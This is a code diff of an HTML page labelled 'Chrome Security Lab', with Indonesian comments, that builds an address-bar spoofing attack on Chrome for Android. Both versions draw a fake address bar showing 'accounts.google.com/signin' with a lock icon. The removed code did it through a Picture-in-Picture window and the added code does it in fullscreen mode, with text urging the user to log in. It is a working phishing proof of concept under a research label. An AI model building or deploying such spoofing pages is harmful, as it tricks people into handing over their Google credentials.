@@ -5,72 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Chrome Security Lab - FARISSAL B</title>
     <style>
-        body { 
-            margin: 0; background: #121212; color: #fff; font-family: sans-serif; 
-            display: flex; align-items: center; justify-content: center; height: 100vh; 
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        
+        /* Bar Alamat Palsu - Muncul pas Fullscreen */
+        #fake-ui {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 60px;
+            background: #fff; z-index: 9999; align-items: center; padding: 0 16px;
+            box-sizing: border-box; border-bottom: 1px solid #dadce0;
         }
-        .card { 
-            background: #1e1e1e; padding: 30px; border-radius: 20px; 
-            border: 1px solid #333; width: 85%; text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        .address-bar {
+            background: #f1f3f4; border-radius: 24px; padding: 8px 16px;
+            width: 100%; display: flex; align-items: center; gap: 10px;
         }
-        #startBtn { 
-            background: #8ab4f8; color: #202124; border: none; padding: 18px; 
-            border-radius: 50px; font-weight: bold; width: 100%; font-size: 16px;
-            cursor: pointer;
-        }
-        .status { 
-            margin-top: 20px; font-family: monospace; font-size: 11px; color: #81c995; 
-            text-align: left; background: #000; padding: 10px; border-radius: 10px;
-        }
+
+        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; text-align: center; width: 80%; border: 1px solid #333; }
+        button { background: #8ab4f8; color: #000; border: none; padding: 15px; border-radius: 50px; width: 100%; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2 style="color: #8ab4f8; margin-top: 0;">Chrome Exploit</h2>
-    <p style="color: #9aa0a6; font-size: 13px;">Target: Address Bar Redressing (Android)</p>
-    
-    <button id="startBtn">START RESEARCH SESSION</button>
-    
-    <div id="log" class="status">> Ready for HTTPS execution...</div>
+<div id="fake-ui">
+    <div class="address-bar">
+        <span style="font-size: 16px;">🔒</span>
+        <span style="color: #202124; font-size: 14px;">accounts.google.com/signin</span>
+    </div>
+</div>
+
+<div class="card" id="main-content">
+    <h2 style="color: #8ab4f8;">Security Research</h2>
+    <p style="color: #9aa0a6;">Target: Chrome Android UI Spoofing</p>
+    <button id="launchBtn">CEK KERANAN SISTEM</button>
 </div>
 
 <script>
-    const log = document.getElementById('log');
-    const addLog = (m) => { log.innerHTML += `<br>> ${m}`; log.scrollTop = log.scrollHeight; };
+    const btn = document.getElementById('launchBtn');
+    const fakeUi = document.getElementById('fake-ui');
 
-    document.getElementById('startBtn').addEventListener('click', async () => {
-        addLog("Requesting PiP Window...");
-
-        try {
-            // Meminta PiP Window (Wajib HTTPS agar tidak error)
-            const pipWin = await documentPictureInPicture.requestWindow({
-                width: window.screen.width,
-                height: 150
+    btn.addEventListener('click', () => {
+        // Masuk ke Fullscreen Mode
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().then(() => {
+                // Tampilkan UI palsu begitu masuk fullscreen
+                fakeUi.style.display = 'flex';
+                document.getElementById('main-content').innerHTML = `
+                    <h2 style="color: #4caf50;">SESSION SECURE</h2>
+                    <p>Silakan login di address bar atas.</p>
+                `;
             });
+        } else {
+            alert("Browser lo gak support Fullscreen API.");
+        }
+    });
 
-            addLog("SUCCESS: PiP Active!");
-
-            // Desain Bar Alamat Palsu (Warna & Font Mirip Chrome Android Asli)
-            pipWin.document.body.style.margin = "0";
-            pipWin.document.body.style.padding = "0";
-            pipWin.document.body.style.overflow = "hidden";
-            pipWin.document.body.style.background = "#ffffff";
-
-            pipWin.document.body.innerHTML = `
-                <div style="height: 100vh; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #dadce0; font-family: sans-serif;">
-                    <div style="background-color: #f1f3f4; border-radius: 24px; padding: 10px 20px; width: 100%; display: flex; align-items: center; gap: 12px;">
-                        <span style="font-size: 18px;">🔒</span>
-                        <span style="color: #202124; font-size: 15px; font-weight: 400;">accounts.google.com/signin</span>
-                        <span style="margin-left: auto; color: #5f6368; font-size: 16px;">⋮</span>
-                    </div>
-                </div>
-            `;
-
-        } catch (err) {
-            addLog("ERROR: " + err.message);
-            alert("Error: " + err.message + "\n\nSal, pastiin lo buka link HTTPS!");
+    // Deteksi kalau user keluar dari fullscreen (pencet back)
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            fakeUi.style.display = 'none';
         }
     });
 </script>
